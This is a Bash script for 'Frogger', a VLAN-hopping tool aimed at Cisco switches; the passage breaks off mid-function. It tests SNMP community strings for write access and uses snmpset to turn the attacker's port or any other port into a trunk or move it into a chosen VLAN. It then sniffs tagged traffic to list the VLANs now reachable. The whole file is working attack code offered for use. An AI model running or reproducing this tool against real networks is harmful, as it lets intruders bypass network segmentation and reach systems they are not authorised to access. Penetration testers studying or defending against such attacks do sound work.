#!/usr/bin/env bash
# Frogger - The VLAN Hopper script
# Original developer: Daniel Compton / www.commonexploits.com / contact@commexploits.com / Twitter = @commonexploits - 09/2016
# Developer of this repository: Jennifer Torres / xtormin.com / @xtormin
# Tested on Kali in Raspberry Pi 4B with Cisco devices


### General configuration settings
TAGSEC="30" #change this value for the number of seconds to sniff for 802.1Q/ISL tagged packets
CDPSEC="60" # change this value for the number of seconds to sniff for CDP packets once verified CDP is on
CDPSECR="30" # CDP retry increase value
DTPWAIT="5" # amount of time to wait for DTP attack via yersinia to trigger
NICCHECK="on" # if you are confident your built in NIC will work within VMware then set to off. i.e you have made reg change for Intel card.
DTPSEC="60" # number of seconds to sniff for DTP in passive check option 1. packets are sent every 30-60 seconds depending on the DTP mode.
DTPSECR="30" # DTP retry increase value
SNMPVER="2c" #default version 2 or change to 1 - not tested with v3
PORT="161" #default snmp port

### Output colors
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
MAGENTA=$(tput setaf 5)
CYAN=$(tput setaf 6)
BRIGHT=$(tput bold)
NORMAL=$(tput sgr0)

### Script begins
WRITEOID="1.3.6.1.2.1.1.6.0"
IOSVER="1.3.6.1.2.1.1.1.0"

### DTP Modes for SNMP options
DTP1="Trunk Port - DTP On"
DTP2="Access Port - DTP Off"
DTP3="Desirable - DTP Desirable"
DTP4="Auto - DTP Auto"
DTP5="Trunk Port - DTP On No-Negotiate"

### Clear the screen
clear

### Remove temporal files
control_c() {
  # Remove any .tmp file
  rm *.tmp 2>/dev/null
  printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} CTRL-C abort detected, exiting Frogger."
  exit $?
}

### Script header
VERSION="3.0"
frog() {
tput setaf 2; tput bold sgr0; cat <<"EOT"
                           _   _
                          / \ / \
                        _|_0/-\0_|_
                       /     "     \
                       \'-._____.-'/   
                    .--.'._     _.'.--.
                    |   \/       \/   |
                    |   /         \   |
                 ___\  /  / 3.0 \  \   \___
                \__   (   \__ __/   )   __/
                 /__  |\    _/_    /|  __\
                   |_/ /_/\_\ /_/\_\ \_|
 ________
|_   __  |
  | |_ \_|_ .--.   .--.   .--./)  .--./) .---.  _ .--.  
  |  _|  [ `/'`\]/ .'`\ \/ /'`\; / /'`\;/ /__\\[ `/'`\] 
 _| |_    | |    | \__. |\ \._// \ \._//| \__., | |     
|_____|  [___]    '.__.' .',__`  .',__`  '.__.'[___]    
                        ( ( __))( ( __))

EOT
}

frog
printf '\n \r%s %s\n' "${GREEN}   --- Frogger - The VLAN Hopper Version $VERSION --- ${NORMAL}"

## CHECK REQUIREMENTS

### Check root permission
if [ $EUID -ne 0 ]
	then
		printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} This program must be run as root. Run again with 'sudo'"
        exit 1
fi

### Check for yersinia
which yersinia >/dev/null
if [ $? -eq 1 ]
	then
		printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Unable to find the required Yersinia program, install and try again."
		exit 1
fi

### Check for vconfig
which vconfig >/dev/null
if [ $? -eq 1 ]
	then
		printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}  Warning Unable to find the required vconfig program. The script will work but not be able to create you the virtual interface."
		printf '\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Press enter to continue or quit and run apt-get install vlan and try again" 
		read ENTERKEY
fi

### Check for tshark
which tshark >/dev/null
if [ $? -eq 1 ]
	then
		printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Unable to find the required tshark program, install and try again."
		exit 1
fi

### Check for screen
which screen >/dev/null
if [ $? -eq 1 ]
	then
		printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Unable to find the required screen program, install and try again."
		exit 1
fi

ARPVER=$(arp-scan -V 2>&1 | grep "arp-scan [0-9]" |awk '{print $2}' | cut -d "." -f 1,2)
### Check for arpscan
which arp-scan >/dev/null
if [ $? -eq 1 ]
	then
		printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Unable to find the required arp-scan program, install at least version 1.8 and try again. Download from www.nta-monitor.com."
		exit 1
fi

### Check for ethtool
which ethtool >/dev/null
if [ $? -eq 1 ]
        then
			printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Unable to find the required ethtool program, install and try again."
			exit 1
fi

### Enter key
pause(){
	printf '\n'
	read -p "Press [Enter] key to continue." fackEnterKey
	printf '\n\n'
}

### Show and select interfaces
sourceinterfaces() {
  printf '\n\r%s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} The following Interfaces are available"
  ip addr |grep -o "eth.*:" |grep -v "ether" |cut -d ":" -f1
  printf '\n\r%s\n' "${BRIGHT}${RED}------------------------------------------------------"
  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the interface to scan from as the source"
  printf '\r%s\n\n' "${BRIGHT}${RED}------------------------------------------------------${NORMAL}"

  read INT
  ip addr |grep -o "eth.*:" |grep -v "ether" |cut -d ":" -f1 | grep -i -w  "$INT" >/dev/null

  if [ $? = 1 ]
    then
      printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "Sorry the interface you entered does not exist! - check and try again."
      sourceinterfaces
  fi
  printf '\n'
}

### DTP packets not found and re-run the scan
show_menudtpnotfound() {
  printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------"
  printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Do you want to scan for DTP Packets again?"
  printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------${NORMAL}"
  printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Re-run the DTP Scan again increasing the scan time by "$DTPSECR" seconds"
  printf '\r%s \n\n' "${RED}[2]${NORMAL} - Exit the Script"
}

### Select option
read_optionsdtpnotfound() {
  TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 2 ]${NORMAL}")
  local choice
  read -p "$TXT" choice
  case $choice in
  1) onedtpnotfound ;;
  2) exit 0 ;;
  *) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
  esac
}

### DTP packet found
onedtpnotfound() {
  printf '\n'
  DTPRETRY="true"
  clear
  printf '\n'
  dtpscan
}

### SNMP attack option 4 functions
snmpvlanattack(){
  printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------"
  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the IP address of the device and press ENTER"
  printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------${NORMAL}"
  read IP
  echo $IP | egrep '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}'  >/dev/null 2>&1
  if [ $? != 0 ]
    then
      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "You entered an invalid IP address format."
      snmpvlanattack
    else
      snmpvlanattackset
  fi
}

### SNMP attacks
snmpvlanattackset() {
MYMAC=$(ip addr |grep link/ether | awk '{print $2}' |sort -u |tr ':' ' ')

printf '\n\r%s\n' "${BRIGHT}${RED}-----------------------------------------------------"
printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the SNMP community string and press ENTER"
printf '\r%s\n\n' "${BRIGHT}${RED}-----------------------------------------------------${NORMAL}"
read SNMPCOM

### Nmap to check if SNMP is open
nmapsnmp() {
NMAP=`nmap -sU -sV -p $PORT $IP -n -Pn 2>&1 |grep "open" | awk '{ print $2 }'`
if [ "$NMAP" = "open" ]
	then
		printf '\r\n%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "SNMP was found enabled on ${BRIGHT}${GREEN}"$IP"${NORMAL}"
	else
		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP is either closed or filtered from this device. Check connectivity and try again. Script can't continue."
		#remove tmp files
		rm *.tmp 2>/dev/null
		exit 1
fi
}

nmapsnmp

### SNMP scan function
scansnmpcom() {
  printf '\r\n%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now testing SNMP community with ${BRIGHT}${GREEN}"$SNMPCOM"${NORMAL} string."
  snmpwalk -t 0.5 -c $SNMPCOM -v $SNMPVER $IP 1.3.6.1.2.1.1.1.0 >/dev/null 2>&1

  if [ $? != "0" ]
    then
    printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP community name of "$SNMPCOM" did not work, or this is not a Cisco device."
      #remove tmp files
      rm *.tmp 2>/dev/null
      exit 1
  fi

  snmpcheckrw() {
    echo "$GETLOCATION" >location.tmp
    WRILOC=$(cat location.tmp)
    snmpset -v $SNMPVER -Cq -c "$COMSCAN" $IP "$WRITEOID" s "$WRILOC" 2>/dev/null
    if [ $? = 0 ]
      then
        printf '%s\n' " - ${BRIGHT}${RED}Read-Write${NORMAL} access"
        READW="$COMSCAN"
      else
        printf '%s\n' " - ${BRIGHT}${YELLOW}Read-Only${NORMAL} access"
        READO="$COMSCAN"
    fi
  }

  COMSCAN="$SNMPCOM"

  snmpwalk -v $SNMPVER -c $COMSCAN $IP 2>/dev/null |head -1 |grep -i iso >/dev/null
  if [ $? = 0 ]
    then
      printf '\r%s %s' "${BRIGHT}${GREEN}[+]${NORMAL}" "Valid Community String was found ${BRIGHT}${GREEN}"$COMSCAN"${NORMAL}" ;snmpcheckrw
      GETLOCATION=$(snmpwalk -v $SNMPVER -On -c "$COMSCAN" $IP "$WRITEOID" 2>&1 |cut -d ":" -f 2 | cut -d '"' -f 2)

  fi

}

### SNMP scan execution
scansnmpcom

if [[ -z "$READW" ]]

	then
		printf '\r\n%s \n' "${BRIGHT}${BLUE}[i]${NORMAL} As the string ${BRIGHT}${GREEN}"$COMSCAN"${NORMAL} is Read-Only, I will extract all information, but VLAN Hopping will not be possible"
fi

### Alter port numbers if different switch models into 10001 format.
alterportint() {
  PORTSIZE=$(cat yourport.tmp |wc -L)

  if [ "$PORTSIZE" = "1" ]
   then
          sed -i -e 's/^/1000/' yourport.tmp
  elif [ "$PORTSIZE" = "2" ]
    then
      sed -i -e 's/^/100/' yourport.tmp

  else
          sed -i -e 's/^/10/' yourport.tmp
  fi
}

### VLAN scan
vlanextract() {
  printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Extracting VLAN Information, please wait"

  VLANIDS=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $1}' | cut -d "." -f 16 >ids.tmp)
  VLANNAMES=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $NF}' |sed 's/"//g' >names.tmp)

  COUNTVLANS=$(cat ids.tmp |wc -l)

  if [ "$COUNTVLANS" = 0 ]
    then
      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "No VLANs were found on this device, it is likely this device does not VLANs at all"
      #remove tmp files
      rm *.tmp 2>/dev/null
      exit 1

  else

  printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "There are ${BRIGHT}${GREEN}"$COUNTVLANS"${NORMAL} VLANs configured on this device."

  paste ids.tmp names.tmp |column -t 2>&1 >idsnames.tmp
  IDNAMES=$(cat idsnames.tmp)
  printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
  printf '\r%s\n' "${BRIGHT}${GREEN}$IDNAMES${NORMAL}"
  printf '\r%s \n\n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"

  fi
  FINDMYPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>&1 |grep -i "$MYMAC" |awk '{print $NR}' |cut -d "." -f 13-20)
  YOURPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>&1 |grep "$FINDMYPORT" |awk '{print $NF}'|sort -u)

  if [ "$YOURPORT" != "OID" ]
    then
      printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT"${NORMAL} on the device"
      printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within the default VLAN ${BRIGHT}${GREEN}1${NORMAL}"
      VLANID2="1"
      echo "$YOURPORT" >yourport.tmp
        #detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)

        COUNTPORTLENGTH=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' |wc -L)

          if [ $COUNTPORTLENGTH -gt 2 ]
            then
              alterportint
          fi

    else

      printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "It seems your port is not within the default VLAN 1, it will take more checks to establish your port and VLAN"
      printf '\r%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "In order to find your port I will need to run ${BRIGHT}${GREEN}$COUNTVLANS${NORMAL} SNMP queries (one for each VLAN ID)"

      for VLANID2 in $(cat ids.tmp)
      do

      FINDMYPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID2" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>/dev/null |awk '{print $NR}' |cut -d "." -f 13-20 |awk '{print $NR}')
      if [ -n "$FINDMYPORT2" ]
        then
          printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are within VLAN ${BRIGHT}${GREEN}"$VLANID2"${NORMAL}"
          VLANID3=$VLANID2
      fi

      #FINDMYPORT3=$(cat myport2.tmp |grep -v "OID")
      YOURPORT2=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>/dev/null |grep "$FINDMYPORT2" |awk '{print $NF}'|sort -u)
      done

      printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "You are connected into port ${BRIGHT}${GREEN}"$YOURPORT2"${NORMAL} on the device"
      echo "$YOURPORT2" >yourport.tmp
        #detect if switch port numbers are in different format (as snmpset will fail if 1 and port is 10001)

        COUNTPORTLENGTH=$(snmpwalk -On -t 2 -c $SNMPCOM@"$VLANID3" -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' |wc -L)

          if [ $COUNTPORTLENGTH -gt 2 ]

            then
              alterportint

          fi
  fi

}

# List DTP modes on all ports
dtplistmodes() {
snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13" 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" | sed -e "s/iso.3.6.1.4.1.9.9.46.1.6.1.1.13./Switch Port /g" >listmodes.tmp
LISTDTPMODESRO=$(cat listmodes.tmp)
printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "The following DTP port modes are configured"
printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTDTPMODESRO${NORMAL}"

}


# Extract DTP VLAN Info after attack
dtpattackextract() {
  sourceinterfaces
  tshark -a duration:30 -i $INT -Y "vlan" -x -V 2>&1 |grep -o " = ID: .*" |awk '{ print $NF }' | sort --unique >vlanids.tmp &
  SECONDS=0;
  while sleep .5 && ((SECONDS <= 30)); do
  printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now Extracting VLAN IDs on interface $INT, sniffing 802.1Q tagged packets for" "$((30-SECONDS))" "seconds."
  done
  printf '\n\n'

  # wait to ensure dtp write has finished to file and in sync
  sleep 3 &
  SECONDS=0;
  while sleep .5 && ((SECONDS <= 3)); do
  printf '\r%s %s %1d' "${BRIGHT}${BLUE}[i]${NORMAL}" "Saving DTP Capture" "$((3-SECONDS))"
  done
  printf '\n\n'

  VLANIDS=$(cat vlanids.tmp)
  if [ -z "$VLANIDS" ]
    then
      printf '\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL}" "No VLAN IDs were found within captured data."
      #remove tmp files
      rm *.tmp 2>/dev/null
      exit 1
    else
      printf '\n \r%s %s\n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Your port now has access to the following VLANs."
      printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
      printf '\r%s\n' "${BRIGHT}${GREEN}$VLANIDS${NORMAL}"
      printf '\r%s \n\n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
  fi
}

# vlanextract information
vlanextract

attackselforotherchoice() {
  YOURPORT3=$(cat yourport.tmp)

  show_menusattackselforother() {
  printf '\n\r%s\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------------------"
  printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "You can either attack/alter the port you are connected to, or any other port on the device."
  printf '\r%s\n\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------------------${NORMAL}"
  printf '\r%s %s \n\n' "${GREEN}[1]${NORMAL} - Attack my own port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} connected to device"
  printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Attack another port on the device"
  printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
  }
  read_optionattackselforother() {
  TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
  local choice
  read -p "$TXT" choice
  case $choice in
  1) show_menusattackselfsnmpordtp; read_optionattackselfsnmpordtp  ;;
  2) show_menusattackothersnmpordtp; read_optionattackothersnmpordtp ;;
  3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
  *) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
  esac
  }

  show_menusattackselfsnmpordtp() {
  printf '\n\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------------------"
  printf '\r%s %s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Make TRUNK port or manual specify VLAN ID for your port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} ?"
  printf '\r%s\n\n' "${BRIGHT}${RED}----------------------------------------------------------------------${NORMAL}"
  printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Make my own port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} a TRUNK (access all VLANs)"
  printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Enter single VLAN ID on my own port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} (specific VLAN access)"
  printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
  }

  read_optionattackselfsnmpordtp() {
  TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
  local choice
  read -p "$TXT" choice
  case $choice in
  1) dtpvlanin ; dtpattackextract ;;
  2) snmphopvlanin ;;
  3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
  *) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
  esac
  }

  show_menusattackothersnmpordtp() {
  printf '\n\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------------------------"
  printf '\r%s %s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Make TRUNK port or manual specify VLAN ID for another port on device?"
  printf '\r%s\n\n' "${BRIGHT}${RED}----------------------------------------------------------------------------${NORMAL}"
  printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Make another port a TRUNK (access all VLANs)"
  printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Enter single VLAN ID on another port (specific VLAN access)"
  printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
  }

  read_optionattackothersnmpordtp() {
  TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
  local choice
  read -p "$TXT" choice
  case $choice in
  1) dtpvlaninwhichport ;;
  2) snmphopvlaninwhichport ;;
  3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
  *) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
  esac
  }

  show_menusattackselforother
  read_optionattackselforother

}

snmphopvlanin() {
  YOURPORT3=$(cat yourport.tmp)

  printf '\n\r%s\n' "${BRIGHT}${RED}-------------------------------------------------------------------------------------"
  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} What VLAN would like you to be in? Enter the ID number and press Enter"
  printf '\r%s\n\n' "${BRIGHT}${RED}-------------------------------------------------------------------------------------${NORMAL}"
  read WHATVLANIN
  #make/ensure it is an access port (otherwise will fail on some switches)
  snmpset -v $SNMPVER -Cq -c $SNMPCOM $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13.""$YOURPORT3" i 2 2>/dev/null
  sleep 2
  snmpset -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.68.1.2.2.1.2.""$YOURPORT3" i "$WHATVLANIN" 2>/dev/null
  printf '\n\n'
      SECONDS=0;
      while sleep .5 && ((SECONDS <= 5)); do
        printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now sleeping for" "$((5-SECONDS))" "seconds whilst port state changes happen."
      done
      printf '\n\n'
  sleep 3
  printf '\r%s %s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Your port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} should now be in VLAN ${BRIGHT}${GREEN}"$WHATVLANIN"${NORMAL}"
}

  dtpvlanin () {
  # when port is not in VLAN one you need to use comstring@vlanid i.e $SNMPCOM@50 is for vlan 50 using $SNMPCOM.
  YOURPORTMOD=$(cat yourport.tmp)
  LISTDTPMODES="1.3.6.1.4.1.9.9.46.1.6.1.1.13"
  MANLANINFO="1.3.6.1.4.1.9.9.46.1.2"
  WALKDTPMODES=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP $LISTDTPMODES 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" 2>/dev/null)
  WHATDTP=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP $LISTDTPMODES 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" 2>/dev/null |grep "13.$YOURPORTMOD = " |cut -d "=" -f 2 |awk '{sub(/^[ \t]+/, ""); print}')

  if [ "$WHATDTP" != "$DTP5" ]
    then
      printf '\n\n'
      printf '\r%s %s\n' "${BRIGHT}${BLUE}[i]${NORMAL} Enabling DTP TRUNK on port ${BRIGHT}${GREEN}"$YOURPORTMOD"${NORMAL}"
      #set to trunk port INTEG 1
      snmpset -v $SNMPVER -Cq -c "$SNMPCOM" "$IP" "$LISTDTPMODES"."$YOURPORTMOD" i 1 >/dev/null 2>&1
      printf '\n'
      SECONDS=0;
      while sleep .5 && ((SECONDS <= 25)); do
        printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now sleeping for" "$((25-SECONDS))" "seconds whilst port state changes happen."
      done
      printf '\n\n'
  else
      printf '\r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} It seems your port ${BRIGHT}${GREEN}"$YOURPORTMOD"${NORMAL} is already a trunk port, no need to run any DTP attacks!"
      sourceinterfaces
      dtpattackextract
  fi
}

dtpvlanwhichportset(){

  printf '\n\n'
  printf '\r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Enabling DTP TRUNK on port ${BRIGHT}${GREEN}"$PORTNUMDTP"${NORMAL}"
  #set to trunk port INTEG 1
  snmpset -v $SNMPVER -Cq -c "$SNMPCOM" "$IP" "$LISTDTPMODES"."$PORTNUMDTP" i 1 >/dev/null 2>&1
  sleep 5
  printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Port ${BRIGHT}${GREEN}"$PORTNUMDTP"${NORMAL} should now be a TRUNK port."

}

dtpvlaninwhichport () {
  YOURPORTMOD=$(cat yourport.tmp)
  LISTDTPMODES="1.3.6.1.4.1.9.9.46.1.6.1.1.13"
  printf '\n\r%s\n' "${BRIGHT}${RED}---------------------------------------------------------------------------------------------"
  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the port number from the list below to set the port to a trunk and press ENTER"
  printf '\r%s\n' "${BRIGHT}${RED}---------------------------------------------------------------------------------------------${NORMAL}"

  snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' >listports.tmp

  LISTPORTS=$(cat listports.tmp)
  printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTPORTS${NORMAL}"

  read PORTNUMDTP

  cat listports.tmp | grep -o -w "$PORTNUMDTP" >/dev/null 2>&1
  if [ $? != 0 ]
    then
      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "That port number does exist, try again."
      dtpvlaninwhichport
    else
      dtpvlanwhichportset
  fi
}

snmphopvlaninwhichportset(){
  printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------"
  printf '\r%s %s\n' "${BRIGHT}${RED}[?]${NORMAL} Which VLAN ID number do you want to move port ${BRIGHT}${GREEN}$SNMPPORTNUMIN${NORMAL} into? enter number and press ENTER"
  printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------${NORMAL}"

  read SNMPVLANIN
  printf '\n\n'
  #make/ensure it is an access port (otherwise will fail on some switches)
  snmpset -v $SNMPVER -Cq -c $SNMPCOM $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13.""$SNMPPORTNUMIN" i 2 2>/dev/null
  sleep 2
  snmpset -c $SNMPCOM -v $SNMPVER $IP 1.3.6.1.4.1.9.9.68.1.2.2.1.2.$SNMPPORTNUMIN i $SNMPVLANIN >/dev/null 2>&1
  printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Port ${BRIGHT}${GREEN}"$SNMPPORTNUMIN"${NORMAL} should now be in VLAN ${BRIGHT}${GREEN}"$SNMPVLANIN"${NORMAL}."
}
snmphopvlaninwhichport() {
  printf '\n\r%s\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------"
  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the port number from the list below to change the port VLAN press ENTER"
  printf '\r%s\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------${NORMAL}"

  snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' >listports.tmp

  LISTPORTS=$(cat listports.tmp)
  printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTPORTS${NORMAL}"
  read SNMPPORTNUMIN

  cat listports.tmp | grep -o -w "$SNMPPORTNUMIN" >/dev/null 2>&1
  if [ $? != 0 ]
    then
      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "That port number does exist, try again."
      snmphopvlaninwhichport
    else
      snmphopvlaninwhichportset
  fi
}

### attack menu
if [ -n "$READW" ]
	then
		attackselforotherchoice
	else
		dtplistmodes
fi
}

# snmpvlanattack function end

# snmpextract (read only) function start.
snmpextractro(){
  printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------"
  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the IP address of the device and press ENTER"
  printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------${NORMAL}"
  read IP
  echo $IP | egrep '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}'  >/dev/null 2>&1
  if [ $? != 0 ]
    then
      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "You entered an invalid IP address format."
      snmpvlanattack
    else
      snmpextractrorun
  fi
}

snmpextractrorun() {
  MYMAC=$(ip addr |grep link/ether | awk '{print $2}' |sort -u |tr ':' ' ')

  printf '\n\r%s\n' "${BRIGHT}${RED}-------------------------------------------------------"
  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the SNMP community string and press ENTER"
  printf '\r%s\n\n' "${BRIGHT}${RED}-------------------------------------------------------${NORMAL}"
  read SNMPCOM

  # nmap to check SNMP is open
  nmapsnmpro() {
